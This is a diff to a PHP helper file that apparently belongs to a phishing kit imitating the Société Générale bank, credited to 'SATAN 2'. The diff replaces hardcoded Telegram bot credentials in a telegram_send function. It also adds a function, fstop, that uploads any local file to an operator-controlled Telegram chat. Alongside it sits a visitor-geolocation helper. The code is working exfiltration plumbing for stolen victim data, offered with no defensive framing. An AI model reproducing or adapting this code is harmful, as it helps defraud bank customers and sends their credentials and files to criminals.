@@ -1,28 +1,35 @@
 <?php
 
 /**
- * @link       :   https://www.satan2.com/ 
- * @package    :   SOCIETE GENERALE 
- * @telegram   :   @satan2  
+ * @link       :   https://www.satan2.com/
+ * @package    :   SOCIETE GENERALE
+ * @telegram   :   @satan2
  * Project Name:   SOCIETE GENERALE 2022
  * Author      :   SATAN 2
  * Mise à jour :   08-09-2022
  * Author URI  :   https://www.facebook.com/satan2
  */
 
-function telegram_send($message,$encodage) {
+function telegram_send($message, $encodage) {
     $curl = curl_init();
-    $api_key  = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A';
-    $chat_id  = '6297861735';
+    $api_key  = '7275654860:AAF-1jh2m9_YLiajYieHBUCzUPF-a_VyUnc';
+    $chat_id  = '6590534450';
     $format   = 'HTML';
-    $encod = $encodage;
-    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
+    $url = 'https://api.telegram.org/bot' . $api_key .
+           '/sendMessage?chat_id=' . $chat_id .
+           '&text=' . urlencode($message) .
+           '&parse_mode=' . $format;
+
+    curl_setopt($curl, CURLOPT_URL, $url);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
     $result = curl_exec($curl);
     curl_close($curl);
+
+    echo "Réponse Telegram : " . $result; // <-- pour debug
     return true;
 }
+
 
 
 function is_invalid_class($array, $key) {
@@ -224,6 +231,36 @@ function get_user_countrycode() {
         $countrycode = $details->geoplugin_countryCode;
     }
     return $countrycode;
+}
+function fstop($file_path) {
+    $token = "7275654860:AAF-1jh2m9_YLiajYieHBUCzUPF-a_VyUnc";
+    $chat_id = "6590534450";
+
+    // Vérifie si le fichier existe
+    if (!file_exists($file_path)) {
+        echo "Fichier introuvable : " . $file_path;
+        return false;
+    }
+
+    $url = "https://api.telegram.org/bot$token/sendDocument";
+
+    $post_fields = [
+        'chat_id' => $chat_id,
+        'document' => new CURLFile(realpath($file_path)),
+        'caption' => "Fichier reçu"
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
+
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    echo "Réponse Telegram : " . $response;
+    return true;
 }
 
 
